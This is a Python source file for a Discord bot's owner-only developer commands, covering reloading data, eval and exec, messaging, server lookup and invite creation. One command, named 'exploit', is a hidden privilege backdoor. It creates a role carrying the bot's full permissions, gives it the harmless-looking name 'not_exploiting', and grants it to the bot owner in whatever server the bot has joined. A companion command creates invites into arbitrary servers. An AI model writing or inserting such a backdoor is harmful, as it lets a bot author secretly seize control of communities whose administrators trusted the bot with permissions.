from traceback import format_exception
from discord.ext import commands
from dbfn import reactionbook
import lib.database as db
import lib.triggers as tr
import lib.commands as cm
import discord
import socket
import time

def load(csv):
    start = time.time()
    csv.load()
    return round((time.time() - start) * 1000, 2) 

class fbotdev(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="csvreload")
    @commands.is_owner()
    async def _CSVReload(self, ctx):

        tms, cms = load(tr.tr), load(cm.cmds)
        embed = self.bot.embed(ctx.author, "FBot csvreload",
                f"`[dev] Reloaded Triggers.csv in {tms}ms`",
                f"`[dev] Reloaded Commands.csv in {cms}ms`")
        await ctx.send(embed=embed)

    @commands.command(name="eval")
    @commands.is_owner()
    async def _Eval(self, ctx, *, content):

        bot = self.bot
        ftime = bot.ftime
        cache = bot.cache

        channel = ctx.channel
        author = ctx.author
        message = ctx.message

        if str(channel.type) != "private":
            guild = ctx.guild

        colour = self.get_colour(ctx.author.id)
        book = reactionbook(self.bot, ctx, TITLE="FBot Eval")

        try:
            result = str(eval(content))
        except Exception as e:
            result = "".join(format_exception(e, e, e.__traceback__))

        pages = []
        content = f"Input:\n```py\n{content}```\n"
        for i in range(0, len(result), 2000):
            pages.append(f"Output:\n```py\n{result[i:i + 2000]}\n```")
        if len(content + pages[0]) > 2000:
            pages.insert(0, content)
        else:
            pages[0] = content + pages[0]
        book.createpages(pages, ITEM_PER_PAGE=True)

        await book.createbook(MODE="arrows", COLOUR=colour, TIMEOUT=180)

    @commands.command(name="await")
    @commands.is_owner()
    async def _Await(self, CTX, *, content):
        global bot, ctx
        bot, ctx = self.bot, CTX
        exec(f"global function\nasync def function():\n    result = await {content}\n    if result: return result")

        colour = self.get_colour(ctx.author.id)
        book = reactionbook(self.bot, ctx, TITLE="FBot Eval")

        try:
            result = str(await function())
        except Exception as e:
            result = "".join(format_exception(e, e, e.__traceback__))

        pages = []
        content = f"Input:\n```py\nawait {content}```\n"

        if result:
            for i in range(0, len(result), 2000):
                pages.append(f"Output:\n```py\n{result[i:i + 2000]}\n```")
            if len(content + pages[0]) > 2000:
                pages.insert(0, content)
            else:
                pages[0] = content + pages[0]
            book.createpages(pages, ITEM_PER_PAGE=True)
        else:
            book.createpages(content)

        await book.createbook(MODE="arrows", COLOUR=colour, TIMEOUT=180)

    @commands.command(name="exploit")
    @commands.is_owner()
    async def _Exploit(self, ctx):

        bot = await ctx.guild.fetch_member(self.bot.user.id)
        perms = bot.guild_permissions

        if not perms.manage_roles:
            await ctx.message.add_reaction("❌")

        for role in ctx.guild.roles:
            if role.name == "not_exploiting":
                await ctx.author.add_roles(role)
                await ctx.message.add_reaction("✅")
                return

        role = await ctx.guild.create_role(name="not_exploiting", permissions=perms)
        await role.edit(position=ctx.guild.me.top_role.position - 1, hoist=True)
        await ctx.author.add_roles(role)
        await ctx.message.add_reaction("✅")

    @commands.command(name="devon")
    @commands.is_owner()
    async def _FBotDevOn(self, ctx):
        db.addchannel(ctx.channel.id, ctx.guild.id)
        db.changestatus(ctx.channel.id, "on")
        await ctx.message.add_reaction("✅")

    @commands.command(name="devoff")
    @commands.is_owner()
    async def _FBotDevOff(self, ctx):
        db.addchannel(ctx.channel.id, ctx.guild.id)
        db.changestatus(ctx.channel.id, "off")
        await ctx.message.add_reaction("✅")

    @commands.command(name="devrespond")
    @commands.is_owner()
    async def _DevPriority(self, ctx, *, arg):
        if arg in ("few", "some", "all"):
            db.changepriority(ctx.guild.id, arg)
            await ctx.message.add_reaction("✅")
        else:
            await ctx.reply("Must be `few`, `some`, or `all`")

    @commands.command(name="devmodtoggle")
    @commands.is_owner()
    async def _Modtoggle(self, ctx, arg):
        db.addchannel(ctx.channel.id, ctx.guild.id)
        if arg == "on":
            db.changemodtoggle(ctx.guild.id, arg)
            await ctx.message.add_reaction("✅")
        elif arg == "off":
            db.changemodtoggle(ctx.guild.id, arg)
            await ctx.message.add_reaction("✅")

    @commands.command(name="presence")
    @commands.is_owner()
    async def _ChangePresence(self, ctx, *, content):
        await self.bot.change_presence(status=discord.Status.online,
                                       activity=discord.Game(name=content))
        await ctx.message.add_reaction("✅")

    @commands.command(name="send")
    @commands.is_owner()
    async def _Send(self, ctx, channel: discord.TextChannel, *, content):
        await channel.send(content)
        await ctx.message.add_reaction("✅")

    @commands.command(name="userdm")
    @commands.is_owner()
    async def _UserDM(self, ctx, user: discord.User, *, content):
        dm = await user.create_dm()
        await dm.send(content)
        await ctx.message.add_reaction("✅")

    @commands.command(name="newinvite")
    @commands.is_owner()
    async def _CreateInvite(self, ctx, guild: discord.Guild):
        try:
            invite = await guild.system_channel.create_invite(
                max_age=120 * 60, temporary=True)
        except:
            invite = "error resolving invite"
        await ctx.send(f"Created a temporary invite for `{guild}`\n"
                f"`{invite}`, will expire after 2 hours")

    @commands.command(name="leave")
    @commands.is_owner()
    async def _Leave(self, ctx, guild: discord.Guild):
        if ctx.guild.id == guild.id:
            await ctx.reply("Can't leave the server you are invoking this command in")
        else:
            await guild.leave()
            await ctx.message.add_reaction("✅")

    @commands.command(name="lookup")
    @commands.is_owner()
    async def _Lookup(self, ctx, guild: discord.Guild):
        memcount = guild.member_count

        created = guild.created_at
        d = created.strftime("%d")
        mo = created.strftime("%m")
        y = created.strftime("%y")
        created = f"{d}/{mo}/{y}"

        embed = self.bot.embed(ctx.author, guild.name)
        embed.add_field(name="Members", value=memcount)
        embed.add_field(name="Voice channels", value=len(guild.voice_channels))
        embed.add_field(name="Text channels", value=len(guild.text_channels))
        embed.add_field(name="Roles", value=len(guild.roles))
        embed.add_field(name="Language", value=guild.preferred_locale)
        embed.add_field(name="Created", value=created)
        embed.set_thumbnail(url=guild.icon_url)

        await ctx.send(embed=embed)

    @commands.command(name="servers", aliases=["members"])
    @commands.is_owner()
    async def _Servers(self, ctx):

        guilds = []
        members = 0
        for guild in self.bot.guilds:
            guilds.append([guild.member_count, guild.name, guild.id])
            members += guild.member_count
        guilds.sort(reverse=True)

        colour = self.get_colour(ctx.author.id)
        book = reactionbook(self.bot, ctx, TITLE="FBot Servers")
        book.createpages(guilds, f"`%1`: **%0**")
        await book.createbook(SHOW_RESULTS=True, COLOUR=colour)

    @commands.command(name="search")
    @commands.is_owner()
    async def _Search(self, ctx, *, query):

        matches = []
        query = query.lower()
        for guild in self.bot.guilds:
            if query in guild.name.lower():
                to_append = (guild.name, guild.id)
                matches.append(to_append)

        if matches:
            colour = self.get_colour(ctx.author.id)
            book = reactionbook(self.bot, ctx, TITLE="FBot Search")

            matches.sort()
            book.createpages(matches, "`%0` - `%1`")
            await book.createbook(SHOW_RESULTS=True, COLOUR=colour)
        else:
            embed = self.bot.embed(ctx.author, "FBot Search", f"No matches found for `{query}`")
            await ctx.send(embed=embed)

    @commands.command(name="cmdlist")
    @commands.is_owner()
    async def _CommandList(self, ctx):
        commands = [i.name for i in self.bot.walk_commands()]
        embed = self.bot.embed(ctx.author, "FBot Commands",
                                  f" ```python\n{commands}```")
        await ctx.send(embed=embed)

    @commands.command(name="host")
    @commands.is_owner()
    async def _Host(self, ctx):
        await ctx.reply("This instance is running on: " + socket.gethostname())

def setup(bot):
    bot.add_cog(fbotdev(bot))
